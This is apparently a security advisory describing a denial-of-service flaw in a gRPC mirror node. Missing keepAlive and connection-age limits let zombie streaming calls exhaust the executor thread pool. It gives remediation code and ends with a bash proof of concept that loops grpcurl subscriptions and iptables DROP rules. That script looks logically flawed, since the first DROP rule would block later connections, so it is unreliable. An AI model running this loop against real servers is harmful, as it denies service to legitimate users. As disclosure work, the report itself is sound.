### Title
Missing Server-Side keepAlive and Connection Lifecycle Limits Enable Zombie-Connection Thread Exhaustion DoS

### Summary
`grpcServerConfigurer()` in `GrpcConfiguration.java` configures only `maxConcurrentCallsPerConnection` and a custom executor on the `NettyServerBuilder`, leaving all server-side keepAlive and connection lifecycle parameters at their Netty defaults (`Long.MAX_VALUE`, i.e., effectively disabled). An unprivileged external user can open streaming gRPC calls and then silently drop packets (without sending TCP FIN/RST), causing the server to hold those calls open indefinitely. With no bound on the number of connections, an attacker can repeat this to exhaust the shared `applicationTaskExecutor` thread pool, denying service to all legitimate users.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35:

```java
@Bean
ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
        GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
    final var nettyProperties = grpcProperties.getNetty();
    return serverBuilder -> {
        serverBuilder.executor(applicationTaskExecutor);
        serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    };
}
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–14:

```java
public class NettyProperties {
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

**Root cause:**

The `NettyServerBuilder` is never called with any of:
- `keepAliveTime(...)` / `keepAliveTimeout(...)` — server-initiated HTTP/2 PING to detect dead peers
- `maxConnectionIdle(...)` — close connections idle beyond a threshold
- `maxConnectionAge(...)` / `maxConnectionAgeGrace(...)` — force-recycle long-lived connections
- `permitKeepAliveTime(...)` / `permitKeepAliveWithoutCalls(...)` — client keepAlive policy

A grep across the entire codebase (`**/*.java`, `**/*.yml`) returns zero matches for any of these identifiers, confirming no compensating configuration exists anywhere.

Netty gRPC's built-in defaults for all of the above are `Long.MAX_VALUE` nanoseconds — effectively infinite, meaning none of these protections are active.

**Exploit flow:**

1. Attacker opens a TCP connection to port 5600 (publicly exposed, no authentication required for the gRPC streaming endpoint).
2. Attacker initiates a long-running streaming RPC (e.g., `ConsensusService/subscribeTopic`).
3. Attacker installs a local `iptables DROP` rule (or equivalent) for traffic to/from the server — no TCP FIN or RST is sent; the connection silently disappears from the network.
4. The server has no keepAlive probes configured, so it never sends HTTP/2 PING frames. It cannot distinguish a live slow subscriber from a dead one. The streaming call remains open, holding an executor thread.
5. Attacker repeats steps 1–4 across many connections. There is no `maxConnections` or rate-limit on connection establishment in the configurer.
6. The `applicationTaskExecutor` thread pool fills with threads blocked on zombie streaming calls. New legitimate requests are queued or rejected.

**Why existing checks are insufficient:**

`maxConcurrentCallsPerConnection = 5` caps calls *per connection*, not total connections. An attacker opening N connections can hold 5N zombie threads. With no connection count ceiling and no keepAlive to reclaim them, N is unbounded.

The `retriever.timeout = 60s` applies only to the interval between message *emissions* on the retriever side; for a topic with active messages, or for the listener path, it does not bound how long a dead client's call occupies a thread.

### Impact Explanation

The `applicationTaskExecutor` is a shared, bounded thread pool used for all gRPC call handling. Filling it with zombie-call threads causes all subsequent legitimate `subscribeTopic` and other gRPC calls to queue indefinitely or be rejected with `RESOURCE_EXHAUSTED`. This is a complete denial of the gRPC API surface for all users. The impact is high: the mirror node's primary streaming interface becomes unavailable without any server restart or connection recycling mechanism to recover.

### Likelihood Explanation

No authentication or special privilege is required to open a gRPC connection to port 5600. The attacker needs only:
- Network access to the gRPC port (any internet user if the port is public, or any pod/container in the same cluster if internal).
- The ability to drop outbound packets on their own host (trivially done with `iptables -A OUTPUT -d <server_ip> -j DROP` or equivalent — no root required on Linux with user namespaces, or achievable via any firewall the attacker controls).

The attack is repeatable, requires no credentials, no knowledge of topic IDs (a `subscribeTopic` call with any topic ID will establish the streaming connection before the server checks existence), and produces no error visible to the attacker that would indicate failure. It is a straightforward, low-skill DoS.

### Recommendation

Add the following to the `serverBuilder` lambda in `grpcServerConfigurer()`:

```java
serverBuilder.keepAliveTime(30, TimeUnit.SECONDS);
serverBuilder.keepAliveTimeout(10, TimeUnit.SECONDS);
serverBuilder.maxConnectionIdle(5, TimeUnit.MINUTES);
serverBuilder.maxConnectionAge(1, TimeUnit.HOURS);
serverBuilder.maxConnectionAgeGrace(30, TimeUnit.SECONDS);
serverBuilder.permitKeepAliveTime(10, TimeUnit.SECONDS);
serverBuilder.permitKeepAliveWithoutCalls(true);
```

Expose these as configurable fields in `NettyProperties` (parallel to `maxConcurrentCallsPerConnection`) so operators can tune them per deployment. Additionally, consider adding a connection-count limit or rate-limiting at the load balancer/ingress layer (the nginx config already proxies gRPC but imposes no connection rate limit).

### Proof of Concept

```bash
# 1. Install grpcurl (no auth needed)
# 2. Open a streaming subscription (any topic ID)
grpcurl -plaintext -d '{"topicID":{"topicNum":1}}' \
  <server>:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &

# 3. Immediately drop all packets to the server (simulates network partition)
#    without sending FIN/RST — the server never learns the client is gone
sudo iptables -A OUTPUT -d <server_ip> -p tcp --dport 5600 -j DROP

# 4. Repeat steps 2-3 in a loop to fill the executor thread pool:
for i in $(seq 1 200); do
  grpcurl -plaintext -d '{"topicID":{"topicNum":1}}' \
    <server>:5600 \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  sleep 0.1
  sudo iptables -A OUTPUT -d <server_ip> -p tcp --dport 5600 -j DROP
done

# 5. Attempt a legitimate call — it will hang or return RESOURCE_EXHAUSTED
grpcurl -plaintext -d '{"topicID":{"topicNum":2}}' \
  <server>:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
```
